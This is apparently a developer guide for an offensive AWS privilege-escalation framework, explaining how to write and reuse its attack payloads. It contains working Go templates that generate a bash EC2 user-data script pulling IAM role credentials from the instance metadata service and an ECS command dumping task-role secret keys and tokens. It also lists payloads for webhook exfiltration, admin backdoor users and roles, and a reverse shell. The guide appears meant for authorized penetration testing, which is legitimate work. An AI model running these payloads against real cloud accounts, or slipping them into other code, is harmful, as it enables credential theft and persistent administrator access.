# Payload Patterns and Reuse Guide

## When to Reuse vs Create New Payloads

### Decision Tree

1. Does the module use payloads at all?
   - Self-escalation (iam-001 to iam-013): **NO** — direct IAM API calls
   - Two-step (iam-014 to iam-021): **NO** — IAM modification + STS assume
   - Principal-access (sts-001): **NO** — direct STS API call
   - New-passrole with code execution (lambda, ec2, ecs, glue, etc.): **YES**

2. Does `pkg/payloads/{service}/` already exist?
   - If YES: check existing payloads first
   - If NO: create the directory and at least `exfil/output` payload

3. For the existing service, does an existing payload match the exploitation pattern?
   - Same code execution context → reuse directly
   - Similar but different parameters → consider adding options to existing payload
   - Fundamentally different mechanism → create new payload

### Checking Existing Payloads

```go
// In your module, query the registry:
existingPayloads := payloads.GetPayloadsByTags([]string{payloads.TagServiceLambda})
// This returns all registered payloads with the "lambda" tag
```

### Current Payload Inventory

#### Lambda (Python) — `pkg/payloads/lambda/`
| Payload | Tags | Description | Optional Interfaces |
|---------|------|-------------|---------------------|
| `exfil/output` | lambda, python, exfil, output | Returns credentials via Lambda response | — |
| `exfil/https` | lambda, python, exfil, webhook | Sends credentials to webhook URL | — |
| `backdoor/role` | lambda, python, backdoor | Attaches AdministratorAccess to a role | SideEffectReporter |
| `backdoor/user` | lambda, python, backdoor | Creates IAM user with admin access | — |
| `backdoor/attach-policy` | lambda, python, backdoor, direct_action | Attaches AdministratorAccess to an existing IAM user | Verifiable, SideEffectReporter |

#### EC2 (Bash) — `pkg/payloads/ec2/`
| Payload | Tags | Description |
|---------|------|-------------|
| `exfil/webhook` | ec2, bash, exfil, webhook | Sends instance metadata creds to webhook |
| `elevation/direct` | ec2, bash, direct_action | Attaches admin policy to instance role |
| `shell/reverse` | ec2, bash, reverse_shell, network | Opens reverse shell to attacker |

## Payload Template: Lambda (Python)

```go
package lambda

import (
    "fmt"
    "pathrunner/pkg/modules"
    "pathrunner/pkg/payloads"
)

type NewPayload struct{}

func init() {
    payloads.Register(&NewPayload{})
}

func (p *NewPayload) GetName() string        { return "technique/method" }
func (p *NewPayload) GetDescription() string  { return "Description of what this payload does" }
func (p *NewPayload) GetTags() []string {
    return []string{
        payloads.TagServiceLambda,
        payloads.TagLanguagePython,
        payloads.TagTechniqueExfil,
        payloads.TagTransportOutput,
    }
}

func (p *NewPayload) GetOptions() []modules.Option {
    return []modules.Option{
        // Payload-specific options beyond what the module provides
    }
}

func (p *NewPayload) Validate(options map[string]string) error {
    // Validate payload-specific options
    return nil
}

func (p *NewPayload) GenerateCode(options map[string]string) (string, error) {
    code := `import json
import boto3

def lambda_handler(event, context):
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()

    return {
        'statusCode': 200,
        'body': json.dumps({
            'account': identity['Account'],
            'arn': identity['Arn'],
            'user_id': identity['UserId']
        })
    }
`
    return code, nil
}

func (p *NewPayload) ProcessResult(result string) (string, error) {
    // Parse the Lambda response and format for display
    return fmt.Sprintf("Payload result:\n%s", result), nil
}
```

## Payload Template: EC2 (Bash)

```go
package ec2

import (
    "fmt"
    "pathrunner/pkg/modules"
    "pathrunner/pkg/payloads"
)

type NewPayload struct{}

func init() {
    payloads.Register(&NewPayload{})
}

func (p *NewPayload) GetName() string        { return "technique/method" }
func (p *NewPayload) GetDescription() string  { return "Description" }
func (p *NewPayload) GetTags() []string {
    return []string{
        payloads.TagServiceEC2,
        payloads.TagLanguageBash,
        payloads.TagTechniqueExfil,
        payloads.TagTransportWebhook,
    }
}

func (p *NewPayload) GetOptions() []modules.Option {
    return []modules.Option{}
}

func (p *NewPayload) Validate(options map[string]string) error {
    return nil
}

func (p *NewPayload) GenerateCode(options map[string]string) (string, error) {
    script := `#!/bin/bash
# EC2 user-data script
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
ROLE_CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$CREDS")
echo "$ROLE_CREDS"
`
    return script, nil
}

func (p *NewPayload) ProcessResult(result string) (string, error) {
    return fmt.Sprintf("EC2 payload result:\n%s", result), nil
}
```

## Payload Template: ECS (Container Command)

For ECS modules, payloads are typically container commands or overrides. The pattern is similar to EC2 bash but runs inside a container.

```go
package ecs

import (
    "fmt"
    "pathrunner/pkg/modules"
    "pathrunner/pkg/payloads"
)

type ExfilOutput struct{}

func init() {
    payloads.Register(&ExfilOutput{})
}

func (p *ExfilOutput) GetName() string        { return "exfil/output" }
func (p *ExfilOutput) GetDescription() string  { return "Exfiltrate task role credentials via container output" }
func (p *ExfilOutput) GetTags() []string {
    return []string{
        payloads.TagServiceECS,
        payloads.TagLanguageBash,
        payloads.TagTechniqueExfil,
        payloads.TagTransportOutput,
    }
}

func (p *ExfilOutput) GetOptions() []modules.Option {
    return []modules.Option{}
}

func (p *ExfilOutput) Validate(options map[string]string) error {
    return nil
}

func (p *ExfilOutput) GenerateCode(options map[string]string) (string, error) {
    // ECS tasks get credentials via the ECS credential endpoint
    command := `curl -s $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | python3 -c "import sys,json; d=json.load(sys.stdin); print(json.dumps({'AccessKeyId':d['AccessKeyId'],'SecretAccessKey':d['SecretAccessKey'],'Token':d['Token']}))"`
    return command, nil
}

func (p *ExfilOutput) ProcessResult(result string) (string, error) {
    return fmt.Sprintf("ECS task credentials:\n%s", result), nil
}
```

## Optional Payload Interfaces

Beyond the core `Payload` interface, payloads can implement two optional interfaces that enable advanced module behavior. These are defined in `pkg/payloads/interface.go`.

### `Verifiable` — For Event-Triggered Modules

When a payload runs inside an event-triggered function (ESM, CloudWatch Events, etc.), the module can't inspect the function's return value. The `Verifiable` interface lets the module verify the payload's effect by probing the environment.

```go
type Verifiable interface {
    VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error)
}
```

**When to implement**: If the payload modifies observable state (attaches a policy, creates a user, etc.) and the effect can be tested with an API call from the starting user's credentials.

**Example** (`backdoor/attach-policy`): Calls `iam:ListUsers` with the starting user's creds. If the policy was attached, the call succeeds; otherwise it returns AccessDenied.

```go
func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
    iamClient := iam.NewFromConfig(config)
    _, err := iamClient.ListUsers(ctx, &iam.ListUsersInput{MaxItems: aws.Int32(1)})
    if err != nil {
        return false, nil  // Not yet — AccessDenied
    }
    return true, nil  // Policy attached and propagated
}
```

### `SideEffectReporter` — For Cleanup Tracking

When a payload modifies existing resources (attaches a policy to a user, modifies a role trust policy, etc.), those modifications need to be tracked for cleanup. The `SideEffectReporter` interface lets the payload declare what it changed.

```go
type SideEffectReporter interface {
    ReportSideEffects(options map[string]string) []modules.CreatedResource
}
```

**When to implement**: If the payload attaches policies, modifies roles, creates users, or makes any other change to existing resources that should be reverted during cleanup.

**Example** (`backdoor/attach-policy`): Reports the policy attachment as an `iam:attached-policy` resource.

```go
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
    targetUser := options["TARGET_USER"]
    policyArn := options["POLICY_ARN"]
    if policyArn == "" {
        policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
    }
    return []modules.CreatedResource{
        {
            Type:          "iam:attached-policy",
            Name:          fmt.Sprintf("%s←%s", targetUser, "AdministratorAccess"),
            ARN:           policyArn,
            CleanupMethod: "iam:DetachUserPolicy",
            Metadata: map[string]string{
                "principal_type": "user",
                "principal_name": targetUser,
                "policy_arn":     policyArn,
            },
        },
    }
}
```

**Important**: The module (not the payload) is responsible for setting `ModuleID` and `Region` on each side effect before tracking it. See the module template for the pattern.

### Lambda Environment Variables for Payload Parameters

For Lambda payloads, pass runtime parameters via Lambda environment variables rather than string-concatenating them into the Python source code. This is cleaner and avoids injection issues.

**In the payload's GenerateCode()**: Read from `os.environ`:
```python
target_user = os.environ.get('TARGET_USER', '')
policy_arn = os.environ.get('POLICY_ARN', 'arn:aws:iam::aws:policy/AdministratorAccess')
```

**In the module's Execute()**: Set env vars on the Lambda function:
```go
envVars := map[string]string{}
if targetUser := options["TARGET_USER"]; targetUser != "" {
    envVars["TARGET_USER"] = targetUser
}
createInput.Environment = &types.Environment{Variables: envVars}
```

## Service-Specific Notes

### Lambda Payloads
- Always Python (runtime: python3.11+)
- Code must define `lambda_handler(event, context)`
- Return value becomes the invocation result (direct-invoke only; event-triggered modules cannot capture it)
- Use `boto3` for AWS SDK calls inside Lambda
- Zip deployment via `utils.CreateLambdaZip(code)`
- Pass payload parameters via Lambda environment variables (not hardcoded in Python source)
- For event-triggered modules: implement `Verifiable` so the module can confirm the payload executed
- For payloads that modify resources: implement `SideEffectReporter` for cleanup tracking

### EC2 Payloads
- Always bash scripts
- Run as user-data (base64 encoded)
- IMDSv2 for metadata access (use token-based approach)
- Results cannot be directly returned — use webhook or check CloudWatch
- Instance profile credentials via metadata endpoint

### ECS Payloads
- Container commands (bash or language-specific)
- Credentials via `$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`
- Can override container command or use exec
- Results via CloudWatch Logs or container output

### Glue Payloads
- Python scripts for Glue jobs
- Credentials via the Glue job's IAM role
- Results via CloudWatch or S3

## Naming Convention

Payloads follow `technique/method` naming:
- `exfil/output` — Exfiltrate via function/task return value
- `exfil/webhook` — Exfiltrate via HTTP callback
- `exfil/https` — Exfiltrate via HTTPS POST
- `backdoor/role` — Create persistence via IAM role modification
- `backdoor/user` — Create persistence via new IAM user
- `shell/reverse` — Open reverse shell connection
- `elevation/direct` — Direct privilege escalation (e.g., attach admin policy)
